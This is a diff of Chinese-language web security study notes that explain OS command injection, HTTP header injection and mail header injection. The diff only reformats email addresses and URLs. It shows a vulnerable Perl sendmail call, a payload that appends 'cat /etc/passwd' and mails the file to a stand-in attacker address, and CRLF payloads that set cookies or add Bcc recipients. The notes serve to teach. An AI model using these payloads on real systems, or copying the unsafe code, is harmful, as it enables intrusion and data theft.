@@ -57,18 +57,18 @@ flag = 1 的条件被忽略
 ### OS 命令注入攻击
 
 核心代码：<br />
-my $adr = $q->param('mailaddress');<br />open(MAIL, "| /usr/sbin/sendmail $adr");<br />print MAIL "From: info@example.com\n";<br />
+my $adr = $q->param('mailaddress');<br />open(MAIL, "| /usr/sbin/sendmail $adr");<br />print MAIL "From: info @ example.com\n";<br />
 
-当传入 mailaddress 参数为 ; cat /etc/passwd | mail hack@example.jp
+当传入 mailaddress 参数为 ; cat /etc/passwd | mail hack @ example.jp
 
 会执行下面的语句：<br />
-| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp<br />
-将含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。
+| /usr/sbin/sendmail ; cat /etc/passwd | mail hack @ example.jp<br />
+将含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack @ example.jp。
 
 ### HTTP 首部注入攻击
 
 http 头部信息：<br />
-Location: http: //www.example.com/a.cgi?q=101%0D%0ASet-Cookie:+SID=123456789
+Location: http: // www.example.com/a.cgi?q=101%0D%0ASet-Cookie:+SID=123456789
 
 %0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http: //hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。
 
@@ -81,11 +81,11 @@ Set-Cookie: UID=（%0D%0A ：换行符）<br />（%0D%0A ：换行符）<br />
 
 ### 邮件首部注入攻击
 
-bob@hackr.jp%0D%0ABcc: user@example.com
+bob @ hackr.jp%0D%0ABcc: user @ example.com
 
 %0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。
 
-bob@hackr.jp%0D%0A%0D%0ATest Message
+bob @ hackr.jp%0D%0A%0D%0ATest Message
 
 使用两个连续的换行符就有可能篡改邮件文本内容并发送。
 
